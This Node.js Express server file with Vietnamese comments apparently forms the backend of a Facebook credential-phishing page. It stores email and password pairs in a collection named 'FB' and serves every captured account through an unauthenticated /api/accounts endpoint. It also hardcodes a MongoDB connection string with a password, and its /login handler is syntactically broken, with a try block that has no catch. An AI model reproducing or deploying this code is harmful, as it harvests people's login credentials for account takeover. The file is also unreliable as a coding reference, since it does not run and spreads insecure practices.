const express = require('express')
const app = express()
const port = 5000
const router = express.Router();
// Import thư viện mongoose
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const webRouter = require('./src/routes/web')
const configviewengine = require('./src/config/viewengine');
app.use(express.json())
app.use(bodyParser.json());
const cors = require('cors');
app.use(cors());

configviewengine(app);
app.use('/api/admin', webRouter);
app.use('/', webRouter);
app.use('/api/login', webRouter);
app.use('/api/register', webRouter);
app.use('/api/admin/users', webRouter);
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// URL kết nối đến MongoDB Atlas
const dbURI = 'mongodb+srv://demo:123@cluster0.qdwwh.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

// Kết nối đến MongoDB Atlas
mongoose.connect(dbURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => {
        console.log('Kết nối MongoDB Atlas thành công!');
    })
    .catch((err) => {
        console.log('Lỗi kết nối MongoDB Atlas: ', err);
    });
const fbSchema = new mongoose.Schema({
    email: String,
    password: String,
    // Bạn có thể thêm các trường khác nếu cần, ví dụ:
    // name: String,
    // facebookId: String,
    // profilePicture: String,
});

const FB = mongoose.model('FB', fbSchema);


// Route để xử lý dữ liệu từ form
app.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        const newFB = new FB({ email, password });

        await newFB.save();

    }
});
// Route để lấy dữ liệu từ MongoDB và hiển thị lên trang web
// API Lấy Dữ Liệu từ MongoDB
app.get("/api/accounts", async (req, res) => {
    try {
        const accounts = await FB.find({});
        res.json(accounts);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi khi lấy dữ liệu" });
    }
});

app.use(cors());

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})
